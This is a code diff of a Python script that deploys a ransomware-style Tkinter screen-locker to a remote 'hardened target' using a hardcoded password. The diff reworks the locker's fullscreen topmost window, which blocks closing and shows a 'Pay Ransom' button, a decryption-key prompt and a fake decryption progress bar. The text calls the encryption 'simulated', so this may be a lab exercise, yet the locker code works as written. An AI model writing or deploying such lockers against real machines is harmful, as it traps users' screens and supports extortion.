@@ -10,7 +10,7 @@ PASSWORD = "CEOPass123!"
 def main():
     print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")
 
-    # The Tkinter Payload with xdotool bypass and Custom Password Prompt
+    # The Tkinter Payload with Frame switching
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import time
@@ -26,50 +26,34 @@ def force_fullscreen():
     except Exception:
         pass
 
-def pay_ransom():
-    # Create a custom pop-up window
-    prompt = tk.Toplevel(root)
-    prompt.title("Payment Required")
-    prompt.geometry("400x150")
-    prompt.configure(bg="gray20")
-    prompt.attributes('-topmost', True) # Force it above the black screen
-    prompt.resizable(False, False)
-    
-    # Center the popup on the screen
-    screen_width = root.winfo_screenwidth()
-    screen_height = root.winfo_screenheight()
-    x = (screen_width // 2) - 200
-    y = (screen_height // 2) - 75
-    prompt.geometry(f"400x150+{x}+{y}")
+def show_lock_screen():
+    prompt_frame.pack_forget()
+    lock_frame.pack(expand=True, fill='both')
 
-    # Block closing the prompt via the X button without a password
-    prompt.protocol("WM_DELETE_WINDOW", lambda: None)
-
-    tk.Label(prompt, text="Enter the decryption key:", bg="gray20", fg="white", font=("Courier", 14)).pack(pady=10)
-    
-    entry = tk.Entry(prompt, show="*", font=("Courier", 14))
-    entry.pack(pady=5)
+def show_prompt_screen():
+    lock_frame.pack_forget()
+    prompt_frame.pack(expand=True, fill='both')
     entry.focus_set()
 
-    def check_password():
-        if entry.get() == "Ransomware2026!":
-            prompt.destroy()
-            lbl.config(text="Decrypting...")
+def check_password():
+    if entry.get() == "Ransomware2026!":
+        prompt_frame.pack_forget()
+        # Re-use the lock frame for the decryption progress
+        lbl.config(text="Decrypting...")
+        lock_frame.pack(expand=True, fill='both')
+        root.update()
+        for i in range(0, 101, 10):
+            lbl.config(text=f"Decrypting your files... {i}%")
             root.update()
-            for i in range(0, 101, 10):
-                lbl.config(text=f"Decrypting your files... {i}%")
-                root.update()
-                time.sleep(0.2)
-            root.destroy()
-        else:
-            # Flash red on error
-            entry.delete(0, tk.END)
-            prompt.configure(bg="darkred")
             time.sleep(0.2)
-            prompt.configure(bg="gray20")
-
-    tk.Button(prompt, text="Submit", command=check_password, bg="gray50", fg="white", font=("Courier", 12)).pack(pady=5)
-    entry.bind('<Return>', lambda event: check_password())
+        root.destroy()
+    else:
+        # Flash red on error
+        entry.delete(0, tk.END)
+        prompt_frame.configure(bg="darkred")
+        prompt_frame.update()
+        time.sleep(0.3)
+        prompt_frame.configure(bg="black")
 
 root = tk.Tk()
 root.title("System Locked")
@@ -81,13 +65,33 @@ screen_height = root.winfo_screenheight()
 root.geometry(f"{screen_width}x{screen_height}+0+0")
 root.attributes('-topmost', True) 
 
-lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
+# --- FRAME 1: The Lock Screen ---
+lock_frame = tk.Frame(root, bg="black")
+lock_frame.pack(expand=True, fill='both')
+
+lbl = tk.Label(lock_frame, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
                fg="lime", bg="black", font=("Courier", 30, "bold"))
 lbl.pack(expand=True, fill='both')
 
-btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
+btn = tk.Button(lock_frame, text="Pay Ransom", command=show_prompt_screen, 
                 bg="darkred", fg="white", font=("Courier", 20, "bold"))
 btn.pack(side="bottom", pady=50)
+
+# --- FRAME 2: The Prompt Screen ---
+prompt_frame = tk.Frame(root, bg="black")
+
+prompt_lbl = tk.Label(prompt_frame, text="Enter the decryption key to unlock your files:", 
+                      fg="lime", bg="black", font=("Courier", 24, "bold"))
+prompt_lbl.pack(expand=True, fill='both')
+
+entry = tk.Entry(prompt_frame, show="*", font=("Courier", 20), width=20)
+entry.pack(pady=20)
+
+submit_btn = tk.Button(prompt_frame, text="Decrypt", command=check_password, 
+                       bg="darkred", fg="white", font=("Courier", 20, "bold"))
+submit_btn.pack(pady=20)
+
+entry.bind('<Return>', lambda event: check_password())
 
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
